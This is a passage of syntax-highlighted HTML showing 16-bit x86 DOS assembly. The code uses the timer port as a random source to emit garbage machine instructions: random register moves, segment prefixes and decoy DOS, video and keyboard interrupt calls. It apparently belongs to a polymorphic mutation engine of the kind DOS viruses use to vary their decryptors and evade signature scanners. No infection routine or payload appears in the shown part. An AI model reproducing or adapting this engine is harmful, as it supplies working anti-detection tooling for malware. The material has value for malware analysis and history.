        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">jch_npt</span><span class="sc0">

</span><span class="sc5">end_cmp_imm_check</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">jch_npt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">instr_change</span><span class="sc0">            </span><span class="sc1">; generate instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">conv16to8</span><span class="sc0">               </span><span class="sc1">; 16 or 8 bit instruction?</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">                 </span><span class="sc1">; select the random immediate</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">stor_chkjmp</span><span class="sc0">             </span><span class="sc1">; check for cmp and store</span><span class="sc0">

</span><span class="sc5">doalea</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; may we create a 8 bit mov?</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">mov16breg</span><span class="sc0">               </span><span class="sc1">; yeah, so select randomly which</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">dowith16b</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">reg8bits</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0b0h</span><span class="sc0">                 </span><span class="sc1">; mov reg8_low,imm</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">dowith16b</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; high 8 bits</span><span class="sc0">
</span><span class="sc5">dowith16b</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">mov16breg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">; mov reg,immediate</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">gen_mpos</span><span class="sc0">

</span><span class="sc5">do_real_lea</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08dh</span><span class="sc0">                 </span><span class="sc1">; store first lea byte</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; ah = used register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">instr_change</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">gen_mpos</span><span class="sc0">

</span><span class="sc5">domemcp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; select segment</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">no_seg_change</span><span class="sc0">           </span><span class="sc1">; nc? only DS:</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">change_to_cs</span><span class="sc0">            </span><span class="sc1">; c? put CS:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">026h</span><span class="sc0">                 </span><span class="sc1">; nc? put ES:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">no_seg_change</span><span class="sc0">
</span><span class="sc5">change_to_cs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02eh</span><span class="sc0">                 </span><span class="sc1">; CS:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">no_seg_change</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08bh</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">; mov reg,seg:[imm]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">instr_change</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">gen_mpos</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">07fffh</span><span class="sc0">                 </span><span class="sc1">;select immediate</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">reg8bits</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">no_2_imms</span><span class="sc0">               </span><span class="sc1">; was an 8 bit instruction?</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">no_2_imms</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">do_random_dx_0f</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">do_random</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">real_random</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">last_random</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; equal as last used?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">isokrandom</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">real_random</span><span class="sc0">
</span><span class="sc5">isokrandom</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">last_random</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">last_random</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">

</span><span class="sc5">real_random</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">real_random</span><span class="sc0">
</span><span class="sc5">end_real_random</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">instr_change</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                  </span><span class="sc1">; generate new instruction</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">finish_instr_change</span><span class="sc0">     </span><span class="sc1">; based on input register.</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">instr_change</span><span class="sc0">
</span><span class="sc5">finish_instr_change</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">conv16to8</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">avante</span><span class="sc0">                  </span><span class="sc1">; only from ax to dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">avante</span><span class="sc0">                  </span><span class="sc1">; do 8 or 16?</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">avante</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc0">                   </span><span class="sc1">; low 8 bits or high 8?</span><span class="sc0">
</span><span class="sc5">avante</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">int10_16</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">no_get_cpos</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                  </span><span class="sc1">; Get cursor position</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">store_int_10</span><span class="sc0">
</span><span class="sc5">no_get_cpos</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">no_int10</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">                  </span><span class="sc1">; Get current video mode</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">store_int_10</span><span class="sc0">
</span><span class="sc5">no_int10</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">no_get_keystroke</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                  </span><span class="sc1">; Get Keystroke</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">store_int_16</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">                      </span><span class="sc1">; Get shift states</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">store_int_16</span><span class="sc0">
</span><span class="sc5">no_get_keystroke</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">                  </span><span class="sc1">; Get KBD functionality</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">store_int_16</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">                      </span><span class="sc1">; get KBD id</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">store_int_16</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">                  </span><span class="sc1">; check for keystroke</span><span class="sc0">
</span><span class="sc5">store_int_16</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">16cdh</span><span class="sc0">                </span><span class="sc1">; int 16h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">sto_n_xit</span><span class="sc0">
</span><span class="sc5">store_int_10</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10cdh</span><span class="sc0">                </span><span class="sc1">; int 10h</span><span class="sc0">
</span><span class="sc5">sto_n_xit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">look_4_int_jmp</span><span class="sc0">


</span><span class="sc5">generate_int</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">doint</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; rnd in ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b4h</span><span class="sc0">                         </span><span class="sc1">; MOV ah,</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">nocx</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">go_on_ah</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">count_reg</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">go_on_ah</span><span class="sc0">                        </span><span class="sc1">; togli se non usi AX x cnt</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">count_reg</span><span class="sc4">],</span><span class="sc2">03h</span><span class="sc0">     </span><span class="sc1">; is BX as counter?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">lamah_jump</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">point_reg</span><span class="sc4">],</span><span class="sc2">03h</span><span class="sc0">     </span><span class="sc1">; is BX as pointer?</span><span class="sc0">
</span><span class="sc5">lamah_jump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">intwithacd</span><span class="sc0">                      </span><span class="sc1">; those with AX,CX,DX</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">es_bx_oper</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">int10_16</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">es_bx_oper</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">intwithacd</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">go_on_ah</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">allocmem</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getpsp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">                          </span><span class="sc1">; dos version</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">storeandint</span><span class="sc0">
</span><span class="sc5">go_on_ah</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">onlyahint</span><span class="sc0">
</span><span class="sc5">es_bx_oper</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">es_mody</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">no_es_modify</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">no_get_dta</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">get_indos_flag</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02fh</span><span class="sc0">                         </span><span class="sc1">; get dta</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">storeandint</span><span class="sc0">
</span><span class="sc5">get_indos_flag</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">034h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">storeandint</span><span class="sc0">                     </span><span class="sc1">; get address indos flag</span><span class="sc0">
</span><span class="sc5">no_get_dta</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getintvec</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc0">                          </span><span class="sc1">; get list of the lists</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">storeandint</span><span class="sc0">
</span><span class="sc5">getintvec</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">35h</span><span class="sc0">                          </span><span class="sc1">; getintvec</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">storeandint</span><span class="sc0">
</span><span class="sc5">no_es_modify</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">space_stuff</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">another_one</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc0">                          </span><span class="sc1">; get psp adress</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">storeandint</span><span class="sc0">
</span><span class="sc5">space_stuff</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">36h</span><span class="sc0">                          </span><span class="sc1">; get free disk space C:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03b2h</span><span class="sc0">                         </span><span class="sc1">; mov dl,03</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">storeandint</span><span class="sc0">
</span><span class="sc5">another_one</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
